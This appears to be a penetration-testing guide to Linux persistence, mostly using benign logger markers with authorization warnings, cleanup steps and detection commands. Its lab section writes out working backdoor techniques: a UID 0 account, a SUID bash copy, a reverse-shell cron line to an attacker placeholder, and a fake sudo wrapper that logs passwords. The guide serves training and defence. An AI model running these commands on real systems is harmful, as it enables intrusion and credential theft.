# Linux Persistence

Linux persistence uses authentication files, schedulers, services, and user startup behavior to regain execution after a session ends or a host reboots. These changes are intrusive and must be planned as carefully as privilege escalation.

{% hint style="danger" %}
Confirm explicit written authorization before creating persistence. Use a benign marker action, preserve the original configuration, and define cleanup before changing accounts, SSH keys, cron, systemd, shell startup files, or privileged hooks.
{% endhint %}

## Assessment workflow

1. Identify the current user, privilege level, distribution, init system, and logging controls.
2. Choose the least invasive mechanism that proves the control gap.
3. Back up the exact file or object that will change.
4. Create a uniquely named marker action and trigger it once.
5. Capture file metadata, process ancestry, and audit or journal events.
6. Remove only the assessment artifact and restore the original state.
7. Repeat the trigger and verify no execution occurs.

```bash
export ASSESSMENT_ID='<ENGAGEMENT_ID>'
export MARKER_DIR="/tmp/assessment-${ASSESSMENT_ID}"
mkdir -p "$MARKER_DIR"
```

## SSH authorized keys

An added public key persists as long as the account and key entry remain valid. Prefer a dedicated assessment key with a recognizable comment.

```bash
install -d -m 700 ~/.ssh
cp -p ~/.ssh/authorized_keys "$MARKER_DIR/authorized_keys.before" 2>/dev/null || true
printf '%s\n' 'ssh-ed25519 <PUBLIC_KEY> assessment-<ENGAGEMENT_ID>' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

Evidence and detection:

- Record the target account, key fingerprint, file owner, mode, and timestamps.
- Monitor writes to `authorized_keys` and unexpected successful key authentication.
- Do not copy or expose unrelated private keys.

Cleanup removes the exact line by its unique comment, then compares the result with the backup:

```bash
sed -i '/ assessment-<ENGAGEMENT_ID>$/d' ~/.ssh/authorized_keys
ssh-keygen -lf ~/.ssh/authorized_keys 2>/dev/null || true
```

## Cron

User crontabs and `/etc/cron.d` provide recurring or reboot-triggered execution. Use `logger` or a marker file instead of a callback payload.

```bash
crontab -l > "$MARKER_DIR/crontab.before" 2>/dev/null || true
(
  crontab -l 2>/dev/null
  echo "*/15 * * * * logger -t assessment-${ASSESSMENT_ID} 'authorized persistence check'"
) | crontab -
crontab -l
```

Detection includes crontab file changes, auditd watches, cron logs, and repeated child processes. Cleanup should filter only the unique assessment entry:

```bash
crontab -l | grep -v "assessment-${ASSESSMENT_ID}" | crontab -
crontab -l | grep "assessment-${ASSESSMENT_ID}" || true
```

Never use `crontab -r` as generic cleanup because it deletes legitimate jobs.

## Systemd user services and timers

A user service avoids modifying system-wide units and is suitable for a controlled proof when user-level persistence is in scope.

```bash
unit_dir="$HOME/.config/systemd/user"
mkdir -p "$unit_dir"
cat > "$unit_dir/assessment-${ASSESSMENT_ID}.service" <<EOF
[Unit]
Description=Authorized persistence validation

[Service]
Type=oneshot
ExecStart=/usr/bin/logger -t assessment-${ASSESSMENT_ID} systemd-user-service
EOF

cat > "$unit_dir/assessment-${ASSESSMENT_ID}.timer" <<EOF
[Unit]
Description=Authorized persistence validation timer

[Timer]
OnActiveSec=2m
Unit=assessment-${ASSESSMENT_ID}.service

[Install]
WantedBy=timers.target
EOF

systemctl --user daemon-reload
systemctl --user enable --now "assessment-${ASSESSMENT_ID}.timer"
systemctl --user list-timers --all
```

Cleanup and verification:

```bash
systemctl --user disable --now "assessment-${ASSESSMENT_ID}.timer"
rm -f "$unit_dir/assessment-${ASSESSMENT_ID}.timer" \
      "$unit_dir/assessment-${ASSESSMENT_ID}.service"
systemctl --user daemon-reload
systemctl --user status "assessment-${ASSESSMENT_ID}.timer" || true
```

System-wide units require root and have a larger blast radius. Validate them only when the authorization specifically requires machine-level persistence.

## Shell startup files

Files such as `.bashrc`, `.bash_profile`, `.profile`, and `.zshrc` run in different interactive or login contexts. A benign marker can demonstrate whether a writable startup file creates persistence.

```bash
startup_file="$HOME/.bashrc"
cp -p "$startup_file" "$MARKER_DIR/bashrc.before"
printf '\nlogger -t assessment-%s "shell startup"\n' "$ASSESSMENT_ID" >> "$startup_file"
```

This method is user-visible and can disrupt shell behavior. Never imitate credential prompts or replace common commands. Cleanup should restore the backed-up file or remove the exact tagged line, then open a new shell to verify it no longer runs.

## Desktop autostart

Graphical sessions may execute `.desktop` files in `~/.config/autostart`:

```ini
[Desktop Entry]
Type=Application
Name=Assessment <ENGAGEMENT_ID>
Exec=/usr/bin/logger -t assessment-<ENGAGEMENT_ID> desktop-autostart
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
```

Record the desktop environment and target user. Remove the exact `.desktop` file and confirm it does not launch at the next approved login.

## Git hooks

Repository-local hooks can execute when a user commits, pushes, checks out, or merges. They demonstrate a software supply-chain persistence path but affect developer workflows.

Inspect first:

```bash
git config --show-origin --get core.hooksPath
find .git/hooks -maxdepth 1 -type f -perm -111 -print 2>/dev/null
```

For an approved proof, create one uniquely named marker action in a disposable test repository. Do not alter production repositories or global `core.hooksPath`. Capture the hook path and trigger, then delete the exact hook and repeat the Git action to verify cleanup.

## Privileged hooks

System-wide services, timers, udev rules, APT hooks, and network startup scripts can execute as root. Treat writable configuration as sufficient evidence unless live validation is explicitly required.

Useful read-only checks:

```bash
systemctl list-unit-files --type=service --type=timer
find /etc/systemd/system /etc/udev/rules.d /etc/apt/apt.conf.d \
  -writable -type f 2>/dev/null
find /etc/cron.d /etc/cron.daily /etc/cron.hourly -writable -type f 2>/dev/null
```

Document the writable path, owner, effective execution identity, trigger, and a safe proof plan. Avoid triggering package managers, device events, or network restarts on production hosts.

## High-risk mechanisms

Backdoor accounts, UID 0 aliases, SUID shell binaries, PAM changes, and shell or `sudo` credential interception create reusable unauthorized access or alter authentication. Do not deploy them as routine proof.

Demonstrate risk with safer evidence:

- Show write permission to `/etc/passwd`, `/etc/shadow`, PAM configuration, or a privileged executable path.
- Show the effective capability or root access that permits the change.
- Reproduce the mechanism in an isolated clone or lab.
- Provide detection and remediation without creating a live backdoor.

## Lab and Training Exercises

Use a disposable VM or container snapshot for these exercises. They create durable privileged access, alter authentication behavior, or collect credentials; each example includes a specific rollback.

### UID 0 account

```bash
sudo useradd -o -u 0 -g 0 -M -s /bin/bash assessment-root
sudo passwd assessment-root
getent passwd assessment-root
```

Observe account-management and authentication logs, then remove the account and verify that only the expected UID 0 account remains:

```bash
sudo userdel assessment-root
awk -F: '$3 == 0 {print $1, $6, $7}' /etc/passwd
```

### SUID shell copy

```bash
sudo cp /bin/bash /var/tmp/assessment-bash
sudo chown root:root /var/tmp/assessment-bash
sudo chmod 4755 /var/tmp/assessment-bash
/var/tmp/assessment-bash -p -c 'id'
```

The `-p` option preserves the effective UID. Cleanup must remove the copy, not alter the system shell:

```bash
sudo rm -f /var/tmp/assessment-bash
test ! -e /var/tmp/assessment-bash
```

### Reverse-shell cron entry

```bash
(crontab -l 2>/dev/null; echo '@reboot /bin/bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1" # assessment-<ENGAGEMENT_ID>') | crontab -
```

Use an isolated network and a non-sensitive test account. Remove only the tagged line:

```bash
crontab -l | grep -v 'assessment-<ENGAGEMENT_ID>' | crontab -
crontab -l | grep 'assessment-<ENGAGEMENT_ID>' || true
```

### Shell credential interception

A shell alias can imitate `sudo`, collect a password, and then call the real binary. This demonstrates why shell startup files are security-sensitive, but it captures a real secret and should use a dedicated lab credential only.

```bash
mkdir -p ~/.assessment
cat > ~/.assessment/sudo <<'EOF'
#!/bin/bash
read -rsp '[sudo] password: ' captured_password
printf '\n%s\n' "$captured_password" >> /tmp/assessment-passwords
exec /usr/bin/sudo "$@"
EOF
chmod 700 ~/.assessment/sudo
echo "alias sudo='$HOME/.assessment/sudo' # assessment-<ENGAGEMENT_ID>" >> ~/.bashrc
```

Cleanup and rotate the lab credential afterward:

```bash
sed -i '/assessment-<ENGAGEMENT_ID>/d' ~/.bashrc
rm -rf ~/.assessment /tmp/assessment-passwords
unalias sudo 2>/dev/null || true
```

### Privileged package hook

APT pre-invoke hooks execute during package operations. In a disposable Debian-family VM, a benign marker demonstrates the root execution context:

```bash
echo 'APT::Update::Pre-Invoke {"/usr/bin/logger -t assessment-<ENGAGEMENT_ID> apt-hook";};' | sudo tee /etc/apt/apt.conf.d/99-assessment
sudo apt-get update
sudo rm -f /etc/apt/apt.conf.d/99-assessment
```

Verify the hook file is absent and inspect the journal for the marker. A reverse shell or authentication modification is unnecessary to prove the behavior.

## Detection and hunting

```bash
# Scheduled execution
crontab -l
find /etc/cron* -type f -maxdepth 2 -ls 2>/dev/null
systemctl list-timers --all
systemctl list-unit-files --type=service --type=timer

# Authentication and shell startup
find /home /root -path '*/.ssh/authorized_keys' -type f -ls 2>/dev/null
find /home /root -maxdepth 2 \( -name '.bashrc' -o -name '.profile' -o -name '.zshrc' \) -ls 2>/dev/null

# Privileged files and account anomalies
find / -xdev -perm -4000 -type f 2>/dev/null
awk -F: '$3 == 0 {print $1, $6, $7}' /etc/passwd
```

Correlate filesystem timestamps with authentication logs, journald, auditd, and process telemetry. A persistence finding should identify both the writable mechanism and the execution context it grants.

## Closeout checklist

- [ ] Original file or configuration backed up
- [ ] Unique marker and trigger documented
- [ ] Execution demonstrated once
- [ ] Logs and process evidence captured
- [ ] Exact entry, key, unit, or file removed
- [ ] Trigger repeated with no execution
- [ ] Legitimate user configuration preserved
- [ ] Cleanup evidence included in the report

## Related

- [Shells & Payloads](shells-payloads.md)
- [Linux Privilege Escalation](linux-privesc-methodology.md)
- [Lateral Movement](lateral-movement.md)
- [Pivoting & Tunneling](pivoting-tunneling.md)
- [Report Writing](report-writing.md)
